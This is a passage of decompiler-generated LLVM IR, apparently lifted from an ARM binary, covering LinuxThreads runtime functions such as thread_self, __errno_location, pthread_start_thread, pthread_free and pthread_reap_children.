  ret i32 %v1_ace0
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_ace8 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_acec = load i32, i32* @sp, align 4
  %v2_acec = sub i32 %v0_acec, %v2_ace8
  %v3_acec = icmp ult i32 %v0_acec, %v2_ace8
  %v4_acec = xor i32 %v0_acec, %v2_ace8
  %v5_acec = xor i32 %v2_acec, %v0_acec
  %v6_acec = and i32 %v5_acec, %v4_acec
  %v7_acec = icmp slt i32 %v6_acec, 0
  store i1 %v7_acec, i1* @cpsr_v, align 1
  %v9_acec = icmp eq i32 %v0_acec, %v2_ace8
  store i1 %v9_acec, i1* @cpsr_z, align 1
  %v1_acf0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_acf0, i32* @r1, align 4
  br i1 %v3_acec, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ad0c, %entry
  %merge = phi i32 [ 173024, %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_ad0c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_ad00 = load i32, i32* @global_var_2b170.180, align 4
  %v3_ad04 = icmp ult i32 %v0_acec, %v2_ad00
  br i1 %v3_ad04, label %bb4, label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %bb3
  %v2_ad10 = load i32, i32* @global_var_2b174.182, align 4
  %v2_ad14 = sub i32 %v0_acec, %v2_ad10
  %v3_ad14 = icmp ult i32 %v0_acec, %v2_ad10
  %v4_ad14 = xor i32 %v2_ad10, %v0_acec
  %v5_ad14 = xor i32 %v2_ad14, %v0_acec
  %v6_ad14 = and i32 %v5_ad14, %v4_ad14
  %v7_ad14 = icmp slt i32 %v6_ad14, 0
  store i1 %v7_ad14, i1* @cpsr_v, align 1
  %v9_ad14 = icmp eq i32 %v0_acec, %v2_ad10
  store i1 %v9_ad14, i1* @cpsr_z, align 1
  br i1 %v3_ad14, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_ad0c, %bb3
  %v2_ad24 = load i32, i32* @global_var_2f558.186, align 4
  store i32 %v2_ad24, i32* @r2, align 4
  %v3_ad28 = and i32 %v1_acf0, -2097152
  %v4_ad28 = xor i32 %v3_ad28, -2097152
  store i1 false, i1* @cpsr_v, align 1
  %v2_ad30 = icmp eq i32 %v2_ad24, 0
  store i1 %v2_ad30, i1* @cpsr_z, align 1
  %v1_ad34 = sub i32 -477, %v4_ad28
  br i1 %v2_ad30, label %dec_label_pc_ad40, label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %bb4
  %v1_ad3c = call i32 @__pthread_find_self(i32 %v1_ad34)
  br label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %bb4, %dec_label_pc_ad3c
  %v0_ad40 = phi i32 [ %v1_ad34, %bb4 ], [ %v1_ad3c, %dec_label_pc_ad3c ]
  %v1_ad40 = add i32 %v0_ad40, -3
  ret i32 %v1_ad40

; uselistorder directives
  uselistorder i32 %v1_ad34, { 1, 0 }
  uselistorder i32 %v2_ad10, { 2, 0, 3, 1 }
  uselistorder i32 %v0_acec, { 5, 0, 1, 6, 4, 7, 9, 2, 3, 8, 10 }
  uselistorder i32 %v2_ace8, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_ad40, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_ad64 = call i32 @thread_self()
  %v1_ad68 = add i32 %v0_ad64, 76
  %v2_ad68 = inttoptr i32 %v1_ad68 to i32*
  %v3_ad68 = load i32, i32* %v2_ad68, align 4
  ret i32 %v3_ad68
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_ad74 = call i32 @thread_self()
  %v1_ad78 = add i32 %v0_ad74, 68
  %v2_ad78 = inttoptr i32 %v1_ad78 to i32*
  %v3_ad78 = load i32, i32* %v2_ad78, align 4
  ret i32 %v3_ad78
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ad80 = load i32, i32* @r4, align 4
  store i32 %v3_ad80, i32* %stack_var_-12, align 4
  %v3_ad88 = load i32, i32* @global_var_2a5d8.188, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v7_ad9c = icmp slt i32 %v3_ad88, %arg1
  br i1 %v7_ad9c, label %dec_label_pc_ada0, label %dec_label_pc_add0

dec_label_pc_ada0:                                ; preds = %entry
  %v0_ada0 = call i32 @sched_get_priority_max()
  store i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), i32* @r4, align 4
  %v0_ada8 = load i32, i32* %r5.global-to-local, align 4
  %v5_adb4 = icmp slt i32 %v0_ada8, %v0_ada0
  br i1 %v5_adb4, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_ada0
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_ada0, %bb
  %v0_adc8 = call i32 @sched_setscheduler()
  %v0_adcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_adcc, i32* @global_var_2a5d8.188, align 4
  %v2_add4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %entry, %bb8
  %v11_add4 = phi i32 [ 1, %entry ], [ %v0_adc8, %bb8 ]
  %v2_add4 = phi i32 [ %v3_ad80, %entry ], [ %v2_add4.pre, %bb8 ]
  store i32 %v2_add4, i32* @r4, align 4
  ret i32 %v11_add4

; uselistorder directives
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_ade4 = load i32, i32* @global_var_2b030.191, align 4
  %v2_ade8 = icmp eq i32 %v2_ade4, 0
  %v2_adec = ptrtoint i32* %stack_var_-152 to i32
  br i1 %v2_ade8, label %dec_label_pc_adf8, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

dec_label_pc_adf8:                                ; preds = %entry
  %v2_adfc = load i32, i32* @global_var_2b034.193, align 4
  %v2_ae00 = icmp eq i32 %v2_adfc, 0
  br i1 %v2_ae00, label %thread-pre-split, label %bb6

bb6:                                              ; preds = %dec_label_pc_adf8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_adf8, %bb, %bb6
  %v0_ae08 = phi i1 [ true, %bb ], [ false, %bb6 ], [ true, %dec_label_pc_adf8 ]
  store i32 1, i32* @global_var_2b030.191, align 4
  br i1 %v0_ae08, label %.dec_label_pc_ae58_crit_edge, label %dec_label_pc_ae1c

.dec_label_pc_ae58_crit_edge:                     ; preds = %thread-pre-split
  %v5_ae5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_ae58

dec_label_pc_ae1c:                                ; preds = %thread-pre-split
  store i32 0, i32* %stack_var_-152, align 4
  br label %dec_label_pc_ae2c

dec_label_pc_ae2c:                                ; preds = %dec_label_pc_ae48, %dec_label_pc_ae1c
  store i32 %v2_adec, i32* @r1, align 4
  %v2_ae34 = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_ae34, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_ae3c = call i32 @__libc_write(i32 %v2_ae34, i32 %v2_adec)
  %v3_ae40 = icmp eq i32 %v2_ae3c, -1
  br i1 %v3_ae40, label %dec_label_pc_ae48, label %dec_label_pc_ae58

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae2c
  %v0_ae48 = call i32 @__errno_location()
  %v1_ae4c = inttoptr i32 %v0_ae48 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  %v7_ae50 = icmp eq i32 %v2_ae4c, 4
  br i1 %v7_ae50, label %dec_label_pc_ae2c, label %dec_label_pc_ae58

dec_label_pc_ae58:                                ; preds = %dec_label_pc_ae2c, %dec_label_pc_ae48, %.dec_label_pc_ae58_crit_edge
  %v5_ae5c = phi i32 [ %v5_ae5c.pre, %.dec_label_pc_ae58_crit_edge ], [ %v2_ae3c, %dec_label_pc_ae2c ], [ %v0_ae48, %dec_label_pc_ae48 ]
  ret i32 %v5_ae5c

; uselistorder directives
  uselistorder i32 %v2_adec, { 1, 0 }
  uselistorder label %dec_label_pc_ae58, { 1, 0, 2 }
  uselistorder label %thread-pre-split, { 2, 0, 1 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_aea8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_ae70 = load i32, i32* @r4, align 4
  %v9_ae70 = load i32, i32* @r6, align 4
  %v2_ae74 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  %v0_ae7c = load i32, i32* %r0.global-to-local, align 4
  %v2_aea8 = icmp eq i32 %arg2, 0
  store i1 %v2_aea8, i1* @cpsr_z, align 1
  br i1 %v2_aea8, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_aea8
  store i32 %v3_ae70, i32* @r4, align 4
  store i32 %v9_ae70, i32* @r6, align 4
  ret i32 %v0_ae7c

bb9:                                              ; preds = %dec_label_pc_aea8
  %v1_aeb0 = add i32 %v2_ae74, 20
  %v2_aeb0 = inttoptr i32 %v1_aeb0 to i32*
  %v3_aeb0 = load i32, i32* %v2_aeb0, align 4
  store i32 %v3_aeb0, i32* %r0.global-to-local, align 4
  store i32 %v3_ae70, i32* @r4, align 4
  %v0_aeb8 = call i32 @kill()
  store i32 %v0_aeb8, i32* %r0.global-to-local, align 4
  %v0_aebc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_aebc, label %bb10, label %bb11

bb10:                                             ; preds = %bb9
  br label %bb11

bb11:                                             ; preds = %bb9, %bb10
  ret i32 %v0_aeb8

; uselistorder directives
  uselistorder i32 %v3_ae70, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_aec0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_aec8 = call i32 @__libc_getpid()
  %v0_aecc = load i32, i32* @r4, align 4
  %v1_aecc = add i32 %v0_aecc, 100
  %v2_aed0 = add i32 %v0_aecc, 20
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aec8, i32* %v3_aed0, align 4
  %v3_aedc = inttoptr i32 %v1_aecc to %_TYPEDEF_sigset_t*
  %v4_aedc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_aedc, i32 0)
  %v0_aee0 = load i32, i32* @r4, align 4
  %v1_aee0 = add i32 %v0_aee0, 228
  %v2_aee0 = inttoptr i32 %v1_aee0 to i32*
  %v3_aee0 = load i32, i32* %v2_aee0, align 4
  %v1_aee4 = icmp slt i32 %v3_aee0, 0
  br i1 %v1_aee4, label %dec_label_pc_aef4, label %bb

bb:                                               ; preds = %entry
  br label %dec_label_pc_af14

dec_label_pc_aef4:                                ; preds = %entry
  %v3_aef8 = load i32, i32* @global_var_2a5d8.188, align 4
  %tmp5 = icmp slt i32 %v3_aef8, 1
  br i1 %tmp5, label %dec_label_pc_af18, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef4
  br label %dec_label_pc_af14

dec_label_pc_af14:                                ; preds = %bb, %dec_label_pc_af04
  %v0_af14 = call i32 @sched_setscheduler()
  br label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_aef4, %dec_label_pc_af14
  %v2_af1c = load i32, i32* @global_var_2f568.200, align 4
  %v2_af20 = icmp eq i32 %v2_af1c, 0
  br i1 %v2_af20, label %dec_label_pc_af78, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af18
  %v2_af2c = load i32, i32* @global_var_2a7b0.202, align 4
  %tmp6 = icmp slt i32 %v2_af2c, 1
  br i1 %tmp6, label %dec_label_pc_af78, label %dec_label_pc_af38

dec_label_pc_af38:                                ; preds = %dec_label_pc_af28
  %v0_af40 = load i32, i32* @r4, align 4
  store i32 %v0_af40, i32* %stack_var_-152, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_af60, %dec_label_pc_af38
  store i32 %v2_aec0, i32* @r1, align 4
  %v2_af4c = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_af4c, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_af54 = call i32 @__libc_write(i32 %v2_af4c, i32 %v2_aec0)
  %v3_af58 = icmp eq i32 %v2_af54, -1
  br i1 %v3_af58, label %dec_label_pc_af60, label %dec_label_pc_af70

dec_label_pc_af60:                                ; preds = %dec_label_pc_af44
  %v0_af60 = call i32 @__errno_location()
  %v1_af64 = inttoptr i32 %v0_af60 to i32*
  %v2_af64 = load i32, i32* %v1_af64, align 4
  %v7_af68 = icmp eq i32 %v2_af64, 4
  br i1 %v7_af68, label %dec_label_pc_af44, label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af44, %dec_label_pc_af60
  %v0_af70 = load i32, i32* @r4, align 4
  %v1_af74 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_af70)
  br label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af28, %dec_label_pc_af18, %dec_label_pc_af70
  %v0_af78 = load i32, i32* @r4, align 4
  %v1_af78 = add i32 %v0_af78, 96
  %v2_af78 = inttoptr i32 %v1_af78 to i32*
  %v3_af78 = load i32, i32* %v2_af78, align 4
  store i32 44932, i32* @lr, align 4
  %v1_af80 = add i32 %v0_af78, 92
  %v2_af80 = inttoptr i32 %v1_af80 to i32*
  %v3_af80 = load i32, i32* %v2_af80, align 4
  call void @__pseudo_branch(i32 %v3_af80)
  %v2_af88 = call i32 @__pthread_do_exit(i32 %v3_af78, i32 %v2_aec0)
  ret i32 %v2_af88

; uselistorder directives
  uselistorder i32 %v2_aec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_af14, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v0_afa0 = call i32 @__libc_getpid()
  %v1_afa8 = load i32, i32* @r4, align 4
  %v2_afa8 = add i32 %v1_afa8, 20
  %v3_afa8 = inttoptr i32 %v2_afa8 to i32*
  store i32 %v0_afa0, i32* %v3_afa8, align 4
  %v0_afac = load i32, i32* @r4, align 4
  %v1_afac = add i32 %v0_afac, 28
  %v2_afac = inttoptr i32 %v1_afac to i32*
  %v3_afac = load i32, i32* %v2_afac, align 4
  %v2_afb0 = call i32 @__pthread_lock(i32 %v3_afac, i32 0)
  %v0_afb4 = load i32, i32* @r4, align 4
  %v1_afb4 = add i32 %v0_afb4, 28
  %v2_afb4 = inttoptr i32 %v1_afb4 to i32*
  %v3_afb4 = load i32, i32* %v2_afb4, align 4
  %v1_afb8 = call i32 @__pthread_unlock(i32 %v3_afb4)
  %v0_afbc = load i32, i32* @r4, align 4
  %v1_afc0 = call i32 @pthread_start_thread(i32 %v0_afbc)
  ret i32 %v1_afc0
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_afc4 = add i32 %arg1, 16
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  %v3_afc4 = load i32, i32* %v2_afc4, align 4
  %v3_afc8 = load i32, i32* @r4, align 4
  store i32 %v3_afc8, i32* %stack_var_-12, align 4
  %v6_afc8 = load i32, i32* @r5, align 4
  %v3_afd4 = urem i32 %v3_afc4, 1024
  %v4_afd8 = mul nuw nsw i32 %v3_afd4, 16
  %v5_afd8 = add i32 %v4_afd8, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %v5_afd8, i32* %r4.global-to-local, align 4
  %v2_afe8 = call i32 @__pthread_lock(i32 %v5_afd8, i32 0)
  %v2_aff0 = add i32 %v4_afd8, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8)
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 0, i32* %v3_aff0, align 4
  %v1_aff8 = load i32, i32* %r4.global-to-local, align 4
  %v2_aff8 = add i32 %v1_aff8, 12
  %v3_aff8 = inttoptr i32 %v2_aff8 to i32*
  store i32 -1, i32* %v3_aff8, align 4
  %v0_affc = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = call i32 @__pthread_unlock(i32 %v0_affc)
  %v2_b008 = load i32, i32* @global_var_2a3c0.207, align 4
  %v0_b00c = load i32, i32* @r5, align 4
  %v1_b00c = add i32 %v0_b00c, 448
  %v2_b00c = inttoptr i32 %v1_b00c to i32*
  %v3_b00c = load i32, i32* %v2_b00c, align 4
  store i32 %v3_b00c, i32* %r4.global-to-local, align 4
  %v1_b010 = add i32 %v2_b008, -1
  store i32 %v1_b010, i32* @global_var_2a3c0.207, align 4
  store i32 %v3_b00c, i32* @r0, align 4
  %v2_b0245 = icmp eq i32 %v3_b00c, 0
  br i1 %v2_b0245, label %dec_label_pc_b02c, label %dec_label_pc_b01c

dec_label_pc_b01c:                                ; preds = %entry, %dec_label_pc_b01c
  %v0_b01c = phi i32 [ %v0_b024, %dec_label_pc_b01c ], [ %v3_b00c, %entry ]
  %v1_b01c = inttoptr i32 %v0_b01c to i32*
  %v2_b01c = load i32, i32* %v1_b01c, align 4
  store i32 %v2_b01c, i32* @r4, align 4
  %v0_b020 = call i32 @free()
  %v0_b024 = load i32, i32* @r4, align 4
  store i32 %v0_b024, i32* @r0, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  br i1 %v2_b024, label %dec_label_pc_b024.dec_label_pc_b02c_crit_edge, label %dec_label_pc_b01c

dec_label_pc_b024.dec_label_pc_b02c_crit_edge:    ; preds = %dec_label_pc_b01c
  %v0_b02c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b024.dec_label_pc_b02c_crit_edge, %entry
  %v0_b02c = phi i32 [ %v0_b02c.pre, %dec_label_pc_b024.dec_label_pc_b02c_crit_edge ], [ %v0_b00c, %entry ]
  %v1_b02c = add i32 %v0_b02c, 452
  %v2_b02c = inttoptr i32 %v1_b02c to i32*
  %v3_b02c = load i32, i32* %v2_b02c, align 4
  store i32 %v3_b02c, i32* %r4.global-to-local, align 4
  store i32 %v3_b02c, i32* @r0, align 4
  %v2_b03c2 = icmp eq i32 %v3_b02c, 0
  br i1 %v2_b03c2, label %dec_label_pc_b044, label %dec_label_pc_b034

dec_label_pc_b034:                                ; preds = %dec_label_pc_b02c, %dec_label_pc_b034
  %v0_b034 = phi i32 [ %v0_b03c.pr, %dec_label_pc_b034 ], [ %v3_b02c, %dec_label_pc_b02c ]
  %v1_b034 = inttoptr i32 %v0_b034 to i32*
  %v2_b034 = load i32, i32* %v1_b034, align 4
  store i32 %v2_b034, i32* @r4, align 4
  %v0_b038 = call i32 @free()
  %v0_b03c.pr = load i32, i32* @r4, align 4
  store i32 %v0_b03c.pr, i32* @r0, align 4
  %v2_b03c = icmp eq i32 %v0_b03c.pr, 0
  br i1 %v2_b03c, label %dec_label_pc_b03c.dec_label_pc_b044_crit_edge, label %dec_label_pc_b034

dec_label_pc_b03c.dec_label_pc_b044_crit_edge:    ; preds = %dec_label_pc_b034
  %v0_b048.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b044

dec_label_pc_b044:                                ; preds = %dec_label_pc_b03c.dec_label_pc_b044_crit_edge, %dec_label_pc_b02c
  %v1_b064 = phi i32 [ %v0_b048.pre, %dec_label_pc_b03c.dec_label_pc_b044_crit_edge ], [ %v0_b02c, %dec_label_pc_b02c ]
  %v9_b048 = icmp eq i32 %v1_b064, ptrtoint (i32* @global_var_2a3e0 to i32)
  br i1 %v9_b048, label %bb, label %bb13

bb:                                               ; preds = %dec_label_pc_b044
  %v3_b04c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_b04c, i32* @r4, align 4
  store i32 %v6_afc8, i32* @r5, align 4
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_b044
  %v1_b050 = add i32 %v1_b064, 392
  %v2_b050 = inttoptr i32 %v1_b050 to i32*
  %v3_b050 = load i32, i32* %v2_b050, align 4
  %v2_b054 = icmp eq i32 %v3_b050, 0
  br i1 %v2_b054, label %bb15, label %bb14

bb14:                                             ; preds = %bb13
  %v3_b058 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_b058, i32* @r4, align 4
  store i32 %v6_afc8, i32* @r5, align 4
  ret i32 0

bb15:                                             ; preds = %bb13
  %v1_b05c = add i32 %v1_b064, 400
  %v2_b05c = inttoptr i32 %v1_b05c to i32*
  %v3_b05c = load i32, i32* %v2_b05c, align 4
  %v2_b060 = icmp eq i32 %v3_b05c, 0
  br i1 %v2_b060, label %bb17, label %bb16

bb16:                                             ; preds = %bb15
  br label %bb17

bb17:                                             ; preds = %bb15, %bb16
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_103d4.209 to i32))
  %v2_b078 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b078, i32* @r4, align 4
  %v0_b07c = call i32 @munmap()
  ret i32 %v0_b07c

; uselistorder directives
  uselistorder i32 %v0_b03c.pr, { 2, 1, 0 }
  uselistorder i32 %v0_b024, { 2, 1, 0 }
  uselistorder i32 %v3_b00c, { 0, 2, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_b034, { 1, 0 }
  uselistorder label %dec_label_pc_b01c, { 1, 0 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_b090 = call i32 @__pthread_restart_new()
  ret i32 %v0_b090
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_b094 = load i32, i32* @r4, align 4
  %v6_b094 = load i32, i32* @r5, align 4
  %v2_b098 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_b19c

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b19c
  store i32 ptrtoint (i32** @global_var_2a7a0.197 to i32), i32* %r3.global-to-local, align 4
  %v2_b0a4 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  br label %dec_label_pc_b144

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b144
  %v1_b0b0 = add i32 %v0_b0c0, 20
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i32*
  %v3_b0b0 = load i32, i32* %v2_b0b0, align 4
  store i32 %v3_b0b0, i32* %r3.global-to-local, align 4
  %v9_b0b4 = icmp eq i32 %v3_b0b0, %v3_b1a8
  %v1_b0b8 = inttoptr i32 %v0_b0c0 to i32*
  %v2_b0b8 = load i32, i32* %v1_b0b8, align 4
  store i32 %v2_b0b8, i32* %r2.global-to-local, align 4
  br i1 %v9_b0b4, label %dec_label_pc_b0c0, label %dec_label_pc_b144

dec_label_pc_b0c0:                                ; preds = %dec_label_pc_b0b0
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c0 = add i32 %v0_b0c0, 4
  %v2_b0c0 = inttoptr i32 %v1_b0c0 to i32*
  %v3_b0c0 = load i32, i32* %v2_b0c0, align 4
  store i32 %v3_b0c0, i32* %r3.global-to-local, align 4
  %v2_b0c4 = add i32 %v2_b0b8, 4
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v3_b0c0, i32* %v3_b0c4, align 4
  %v0_b0c8 = load i32, i32* @r5, align 4
  %v1_b0c8 = add i32 %v0_b0c8, 4
  %v2_b0c8 = inttoptr i32 %v1_b0c8 to i32*
  %v3_b0c8 = load i32, i32* %v2_b0c8, align 4
  store i32 %v3_b0c8, i32* %r3.global-to-local, align 4
  %v1_b0cc = add i32 %v0_b0c8, 28
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  %v0_b0d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b0d0 = inttoptr i32 %v3_b0c8 to i32*
  store i32 %v0_b0d0, i32* %v2_b0d0, align 4
  %v2_b0d8 = call i32 @__pthread_lock(i32 %v3_b0cc, i32 0)
  store i32 %v2_b0d8, i32* @r0, align 4
  %v0_b0dc = load i32, i32* @r5, align 4
  %v1_b0dc = add i32 %v0_b0dc, 412
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  store i1 %v2_b0e0, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_b0e8 = add i32 %v0_b0dc, 46
  %v4_b0e8 = inttoptr i32 %v3_b0e8 to i8*
  store i8 1, i8* %v4_b0e8, align 1
  %v0_b0ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ec, label %dec_label_pc_b120, label %dec_label_pc_b0f0

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0c0
  store i32 ptrtoint (i32* @global_var_2f55c.213 to i32), i32* %r3.global-to-local, align 4
  %v0_b0f4 = load i32, i32* @r5, align 4
  %v1_b0f4 = add i32 %v0_b0f4, 416
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i32*
  %v3_b0f4 = load i32, i32* %v2_b0f4, align 4
  store i32 %v3_b0f4, i32* %r2.global-to-local, align 4
  %v2_b0f8 = load i32, i32* @global_var_2f55c.213, align 4
  %v2_b0fc = or i32 %v2_b0f8, %v3_b0f4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v1_b100 = and i32 %v2_b0fc, 2048
  %v2_b100 = icmp eq i32 %v1_b100, 0
  store i1 %v2_b100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b100, label %dec_label_pc_b120, label %dec_label_pc_b108

dec_label_pc_b108:                                ; preds = %dec_label_pc_b0f0
  %v2_b10c = add i32 %v0_b0f4, 424
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 12, i32* %v3_b10c, align 4
  store i32 ptrtoint (i32* @global_var_2f564.215 to i32), i32* %r3.global-to-local, align 4
  %v0_b114 = load i32, i32* @r5, align 4
  %v2_b114 = add i32 %v0_b114, 428
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* @r5, align 4
  %v1_b118 = load i32, i32* %r3.global-to-local, align 4
  %v2_b118 = inttoptr i32 %v1_b118 to i32*
  store i32 %v0_b118, i32* %v2_b118, align 4
  %v1_b11c = call i32 @__linuxthreads_reap_event(i32 %v2_b0d8)
  br label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b0f0, %dec_label_pc_b0c0, %dec_label_pc_b108
  %v0_b120 = load i32, i32* @r5, align 4
  %v1_b120 = add i32 %v0_b120, 45
  %v2_b120 = inttoptr i32 %v1_b120 to i8*
  %v3_b120 = load i8, i8* %v2_b120, align 1
  %v4_b120 = zext i8 %v3_b120 to i32
  store i32 %v4_b120, i32* @r4, align 4
  %v1_b124 = add i32 %v0_b120, 28
  %v2_b124 = inttoptr i32 %v1_b124 to i32*
  %v3_b124 = load i32, i32* %v2_b124, align 4
  %v1_b128 = call i32 @__pthread_unlock(i32 %v3_b124)
  %v0_b12c = load i32, i32* @r4, align 4
  %v2_b12c = icmp eq i32 %v0_b12c, 0
  store i1 %v2_b12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b12c, label %dec_label_pc_b14c, label %dec_label_pc_b134

dec_label_pc_b134:                                ; preds = %dec_label_pc_b120
  %v0_b134 = load i32, i32* @r5, align 4
  %v1_b138 = call i32 @pthread_free(i32 %v0_b134)
  br label %dec_label_pc_b14c

dec_label_pc_b144:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_b0a0
  %v0_b0c0 = phi i32 [ %v2_b0a4, %dec_label_pc_b0a0 ], [ %v2_b0b8, %dec_label_pc_b0b0 ]
  store i32 %v0_b0c0, i32* @r5, align 4
  %v9_b144 = icmp eq i32 %v0_b0c0, %v2_b0a4
  br i1 %v9_b144, label %dec_label_pc_b14c.loopexit, label %dec_label_pc_b0b0

dec_label_pc_b14c.loopexit:                       ; preds = %dec_label_pc_b144
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b14c.loopexit, %dec_label_pc_b120, %dec_label_pc_b134
  %v2_b150 = load i32, i32* @global_var_2b034.193, align 4
  store i32 %v2_b150, i32* %r3.global-to-local, align 4
  %v2_b154 = icmp eq i32 %v2_b150, 0
  store i1 %v2_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b154, label %dec_label_pc_b170, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b14c
  %v2_b160 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
